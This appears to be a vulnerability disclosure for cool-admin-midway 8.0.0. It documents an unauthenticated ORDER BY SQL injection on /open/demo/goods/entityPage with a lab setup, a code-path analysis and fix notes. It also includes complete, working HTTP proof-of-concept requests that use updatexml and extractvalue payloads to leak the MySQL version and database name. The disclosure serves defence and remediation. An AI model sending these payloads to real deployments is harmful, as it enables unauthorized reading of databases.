### Vulnerability details

**Official website / Product:** https://cool-js.com / https://github.com/cool-team-official/cool-admin-midway

**Repository:** cool-team-official/cool-admin-midway (stars at selection: 3283)

**Vulnerability type:** SQLi (unauthenticated ORDER BY error-based injection)

**Vulnerability versions:** 8.0.0 (audited commit e545ef6f3b0c08581e34bd3207ca57d851ccc3ae; dependency `@cool-midway/core` ^8.0.7 / verified 8.0.7; `typeorm` resolves to `npm:@cool-midway/typeorm@0.3.20`)

**Vulnerability URL / Parameter:** `POST /open/demo/goods/entityPage`, JSON field `order` (sort column, unsanitized/unescaped); `sort` constrained to ASC/DESC by TypeORM

**Complex:** yes

### Verification procedure

Lab topology (original `labs/cool-admin-midway-r66-a3/` and images `cool-admin-midway-r66-a3-cool-app` / `mysql:8.0` were removed per hygiene; the following matches the verified run):

- Repo: `repos/cool-admin-midway` @ `e545ef6f3b0c08581e34bd3207ca57d851ccc3ae` (`package.json` version `8.0.0`)
- Database: `mysql:8.0` service `coolDB` (verified version **8.0.46**, matching the error leak); database `cool`; credentials `root` / `123456` (same as `src/config/config.local.ts`)
- Ports: host **127.0.0.1:24603** → app (container default 8001); **127.0.0.1:24633** → MySQL 3306
- Runtime: `NODE_ENV=local` (enables `initDB`/`synchronize` auto schema); inside the app container TypeORM `host` pointed at `coolDB` (overrides local default `127.0.0.1`)
- Auth: **no credentials required**. `BaseAuthorityMiddleware` (`src/modules/base/middleware/authority.ts` ~lines 51–55) only JWT-gates URLs under `/admin/`; `/open/demo/goods/*` is anonymous

Equivalent compose skeleton (recreate under `labs/cool-admin-midway-r66-a3/` if needed; app image built from repo-root `Dockerfile` (`node:lts-alpine`) with `NODE_ENV=local` and DB host override):

```yaml
services:
  coolDB:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: "123456"
      MYSQL_DATABASE: "cool"
      TZ: Asia/Shanghai
    ports:
      - "24633:3306"
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-p123456"]
      interval: 5s
      timeout: 5s
      retries: 30
  cool-app:
    build:
      context: ../../repos/cool-admin-midway
    image: cool-admin-midway-r66-a3-cool-app
    environment:
      NODE_ENV: local
      TZ: Asia/Shanghai
      # Point local config at compose-network coolDB (entrypoint/patch typeorm host)
      # host=coolDB port=3306 user=root password=123456 database=cool
    ports:
      - "24603:8001"
    depends_on:
      coolDB:
        condition: service_healthy
```

Host-side alternative: run only `mysql:8.0` on 24633, set `config.local.ts` `port` to `24633`, then `npm i && npm run dev` (or build and start with `NODE_ENV=local`) in `repos/cool-admin-midway`, listening on 24603.

After `docker compose up -d`, the verified run looked like:

```text
Lab: labs/cool-admin-midway-r66-a3
Repo commit: e545ef6f3b0c08581e34bd3207ca57d851ccc3ae (cool-admin 8.0.0)
Host ports: app 24603, MySQL 24633

NAME                                IMAGE       SERVICE   STATUS
cool-admin-midway-r66-a3-coolDB-1   mysql:8.0   coolDB    Up (healthy) 0.0.0.0:24633->3306/tcp

App verified against Docker MySQL with NODE_ENV=local (initDB/synchronize), listening on 24603.
PoC confirmed: POST /open/demo/goods/entityPage order=updatexml(...) → XPATH syntax error: '~8.0.46'
```

1. Bring up MySQL + app as above; wait until the app listens on **24603**.
2. Confirm `BaseAuthorityMiddleware` only enforces JWT on `/admin/` prefixes; `/open/demo/goods/*` requires no authentication.
3. Send PoC A below with `order=updatexml(1,concat(0x7e,version()),1)`.
4. Response `message` contains `XPATH syntax error: '~8.0.46'` (MySQL version leak). PoC B with `extractvalue(1,concat(0x7e,database()))` leaks database name `cool`.
5. Baseline `order=id` returns `code=1000` with a normal page payload.

### Complete vulnerability PoC

#### PoC A — `updatexml` MySQL version leak (primary)

Complete HTTP request (Docker-verified):

```http
POST /open/demo/goods/entityPage HTTP/1.1
Host: 127.0.0.1:24603
Content-Type: application/json
Accept: application/json
User-Agent: cool-admin-midway-r66-a3-poc
Content-Length: 81
Connection: close

{"page":1,"size":10,"order":"updatexml(1,concat(0x7e,version()),1)","sort":"asc"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Type: application/json; charset=utf-8
set-cookie: locale=en-us; path=/; max-age=31557600; expires=Tue, 02 Nov 2027 23:38:07 GMT
Content-Length: 55
Date: Mon, 02 Nov 2026 17:38:07 GMT
Connection: close

{"code":1001,"message":"XPATH syntax error: '~8.0.46'"}
```

#### PoC B — `extractvalue` database name leak

Complete HTTP request:

```http
POST /open/demo/goods/entityPage HTTP/1.1
Host: 127.0.0.1:24603
Content-Type: application/json
Accept: application/json
User-Agent: cool-admin-midway-r66-a3-poc
Content-Length: 84
Connection: close

{"page":1,"size":10,"order":"extractvalue(1,concat(0x7e,database()))","sort":"asc"}
```

Complete HTTP response (Docker-verified):

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Connection: close

{"code":1001,"message":"XPATH syntax error: '~cool'"}
```

Verification result notes:

Unauthenticated error-based SQL injection. The JSON error message reflects `updatexml`/`extractvalue` XPATH faults and leaked MySQL **8.0.46** and database name **cool**. Application logs show the full SQL ending in `ORDER BY updatexml(1,concat(0x7e,(SELECT version())),1) ASC LIMIT 10`. PoC B verified response body:

```text
{"code":1001,"message":"XPATH syntax error: '~cool'"}
```

### Vulnerability analysis

The shipped demo “open” API forwards the request body’s `order` into the framework helper `entityRenderPage`:

1. `OpenDemoGoodsController.entityPage` → `DemoGoodsService.entityPage` → `this.entityRenderPage(find, query)`.
2. `@cool-midway/core` `BaseMysqlService.entityRenderPage` calls `find.addOrderBy(order, sort.toUpperCase())` **without** `SqlString.escapeId`, `paramSafetyCheck`, or a column allowlist (unlike `getOptionFind` / `sqlRenderPage` in the same package).
3. TypeORM (`@cool-midway/typeorm@0.3.20`) `createOrderByExpression` uses `replacePropertyNames(columnName)` for unmatched sort keys; `replacePropertyNames` is implemented as `return statement` (no-op), so `order` is concatenated into the `ORDER BY` clause verbatim.
4. `BaseAuthorityMiddleware` only authenticates URLs under `/admin/`, so `/open/...` is anonymous by default → **unauthenticated SQLi**. The same sink is also used by authenticated callers such as task log pagination: `src/modules/task/service/info.ts` ~line 131 `return await this.entityRenderPage(find, query)`.

Trigger / sink source (full path and line numbers):

```typescript
# File: src/modules/demo/controller/open/goods.ts
# Lines: 31-34
  @Post('/entityPage', { summary: 'entity分页查询' })
  async entityPage(@Body() query) {
    return this.ok(await this.demoGoodsService.entityPage(query));
  }
```

```typescript
# File: src/modules/demo/service/goods.ts
# Lines: 39-42
  async entityPage(query) {
    const find = this.demoGoodsEntity.createQueryBuilder();
    return this.entityRenderPage(find, query);
  }
```

```typescript
# File: src/modules/base/middleware/authority.ts
# Lines: 51-55
      url = url.replace(this.prefix, '').split('?')[0];
      const token = ctx.get('Authorization');
      const adminUrl = '/admin/';
      // 路由地址为 admin前缀的 需要权限校验
      if (_.startsWith(url, adminUrl)) {
```

```javascript
# File: node_modules/@cool-midway/core/dist/service/mysql.js
# Lines: 114-126
    async entityRenderPage(find, query, autoSort = true) {
        const { size = this._coolConfig.crud.pageSize, page = 1, order = 'id', sort = 'desc', isExport = false, maxExportLimit, } = query;
        const count = await find.getCount();
        let dataFind;
        if (isExport && maxExportLimit > 0) {
            dataFind = find.limit(maxExportLimit);
        }
        else {
            dataFind = find.offset((page - 1) * size).limit(size);
        }
        if (autoSort) {
            find.addOrderBy(order, sort.toUpperCase());
        }
```

```javascript
# File: node_modules/typeorm/query-builder/SelectQueryBuilder.js (@cool-midway/typeorm@0.3.20)
# Lines: 1306-1334
    createOrderByExpression() {
        const orderBys = this.expressionMap.allOrderBys;
        if (Object.keys(orderBys).length === 0)
            return "";
        return (" ORDER BY " +
            Object.keys(orderBys)
                .map((columnName) => {
                // ...
                return (this.replacePropertyNames(columnName) + " " + orderValue);
            })
                .join(", "));
    }
```

### Fix notes

1. Harden `entityRenderPage` like `getOptionFind`: `SqlString.escapeId` plus a strict column allowlist; keep `sort` limited to `asc`/`desc`.
2. Disable demo/open APIs by default or require authentication; exclude the `demo` module from production builds or gate `/open/demo/**`.
3. Never pass user input directly as the column argument to TypeORM `addOrderBy`.
